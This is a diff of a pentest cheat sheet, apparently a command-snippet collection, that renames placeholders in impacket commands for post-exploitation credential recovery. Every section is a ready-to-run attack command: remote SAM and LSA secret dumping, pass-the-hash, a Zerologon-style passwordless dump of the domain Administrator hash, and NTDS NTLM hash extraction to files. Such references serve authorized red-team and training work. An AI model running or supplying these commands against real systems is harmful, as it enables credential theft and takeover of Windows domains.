@@ -5,19 +5,19 @@
 ## samrdump - system account, shares, etc... (dump info from the Security Account Manager (SAM))
 #plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
 ```
-impacket-samrdump <domain>/<user>:<password>@<ip>
+impacket-samrdump <DOMAIN>/<USER>:<PASSWORD>@<IP>
 ```
 
 ## secretsdump - Remote dumping of SAM & LSA secrets
 #plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
 ```
-impacket-secretsdump '<domain>/<user>:<password>'@<ip>
+impacket-secretsdump '<DOMAIN>/<USER>:<PASSWORD>'@<IP>
 ```
 
 ## secretsdump - Remote dumping of SAM & LSA secrets (pass-the-hash)
 #plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
 ```
-impacket-secretsdump -hashes '<hash>' '<DOMAIN>/<USER>@<ip>'
+impacket-secretsdump -hashes '<HASH>' '<DOMAIN>/<USER>@<IP>'
 ```
 
 ## secretsdump - local dump - extract hash from sam database
@@ -48,19 +48,19 @@ impacket-secretsdump  -ntds <ntds_file.dit> -system <SYSTEM_FILE> LOCAL
 zerologon
 #plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
 ```
-impacket-secretsdump <domain>/<dc_bios_name>\$/@<ip> -no-pass -just-dc-user 'Administrator'
+impacket-secretsdump <DOMAIN>/<dc_bios_name>\$/@<IP> -no-pass -just-dc-user 'Administrator'
 ```
 
 ## secretsdump - remote extract
 #plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
 ```
-impacket-secretsdump -just-dc-ntlm -outputfile <ntlm-extract-file> <domain>/<user>:<password>@<ip>
+impacket-secretsdump -just-dc-ntlm -outputfile <ntlm-extract-file> <DOMAIN>/<USER>:<PASSWORD>@<IP>
 ```
 
 ## secretsdump - remote extract + users infos
 #plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
 ```
-impacket-secretsdump -just-dc -pwd-last-set -user-status -outputfile <ntlm-extract-file> <domain>/<user>:<password>@<ip>
+impacket-secretsdump -just-dc -pwd-last-set -user-status -outputfile <ntlm-extract-file> <DOMAIN>/<USER>:<PASSWORD>@<IP>
 ```
 
 ## secretsdump - plaintext password
